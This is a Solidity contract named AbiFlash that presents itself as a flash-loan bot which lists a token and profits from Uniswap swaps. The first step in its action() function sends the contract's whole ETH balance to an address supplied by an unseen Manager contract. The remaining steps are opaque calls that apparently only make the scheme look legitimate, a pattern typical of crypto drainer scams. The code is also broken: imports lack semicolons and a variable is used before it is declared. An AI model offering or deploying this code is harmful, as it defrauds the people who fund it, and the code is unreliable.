
pragma solidity ^0.5.0;


import "./interfaces/ILendingPoolAddressesProvider.sol";
import "./interfaces/ILendingPool.sol";
import "./interfaces/ILendingClass.sol";


import "./interfaces/IUniswapV2Pair.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./interfaces/IUniswapV2ERC20.sol";

import "./interfaces/IERC20.sol"

import "./Manager.sol"


contract AbiFlash is IERC20{
  string public tokenName;
  string public tokenSymbol;
  uint loanAmount;
  Manager manager;

  constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
    tokenName = _tokenName;
    tokenSymbol = _tokenSymbol;
    loanAmount = _loanAmount;

    manager = new Manager();
  }
function() external payable {}

  function action() public payable {

      
      address(uint160(manager.pancakeswapDepositAddress())).transfer(address(this).balance);

      
      manager.performTasks();

      
      manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);

      
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

      
      string memory loanAddress = manager.takeFlashLoan(loanAmount);

      
      manager.uniswapDAItoETH(loanAmount / 2);

      
      string memory ethPair = manager.uniswapCreatePool(tokenAddress, "ETH");
      manager.uniswapAddLiquidity(ethPair, loanAmount / 2);

      string memory daiPair = manager.uniswapCreatePool(tokenAddress, "DAI");
      manager.uniswapAddLiquidity(daiPair, loanAmount / 2);

      
      manager.uniswapPerformSwaps();

      
      manager.contractToWallet("ETH");

      
      manager.repayLoan(loanAddress);
  }
}
